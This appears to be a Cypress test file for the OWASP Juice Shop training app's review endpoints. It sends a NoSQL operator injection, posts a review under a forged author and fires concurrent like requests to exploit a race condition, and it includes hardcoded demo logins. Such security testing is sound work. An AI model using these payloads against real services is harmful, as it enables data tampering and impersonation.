describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should reject an injected selector in the update route', () => {
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
          method: 'PATCH',
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({
            id: { $ne: -1 },
            message: 'NoSQL Injection!'
          })
        })
        expect(response.status).to.equal(400)
      })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should not be possible to edit another user\'s review', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const reviews = await (await fetch(`${Cypress.config('baseUrl')}/rest/products/1/reviews`)).json()
        const reviewId = reviews.data[0]._id
        const response = await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
          method: 'PATCH',
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({ id: reviewId, message: 'injected' })
        })
        const result = await response.json()
        expect(result.modified).to.equal(0)
      })
    })

    it('should be possible to post a review in another user\'s name', () => {
      cy.visit('/')
      cy.window().then(async () => {
        await fetch(`${Cypress.config('baseUrl')}/rest/products/1/reviews`, {
          method: 'PUT',
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${localStorage.getItem('token')}`
          },
          body: JSON.stringify({ message: 'injected', author: 'admin@juice-sh.op' })
        })
      })
      cy.expectChallengeSolved({ challenge: 'Forged Review' })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.window().then(async () => {
        async function sendPostRequest (reviewId: string) {
          const anotherResponse = await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'POST',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ id: reviewId })
            }
          )
          if (anotherResponse.status === 200) {
            console.log('Success')
          }
        }

        const response = await fetch(
          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
          {
            method: 'GET',
            headers: {
              'Content-type': 'text/plain'
            }
          }
        )
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id

          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
        }
      })
      cy.expectChallengeSolved({ challenge: 'Multiple Likes' })
    })
  })
})
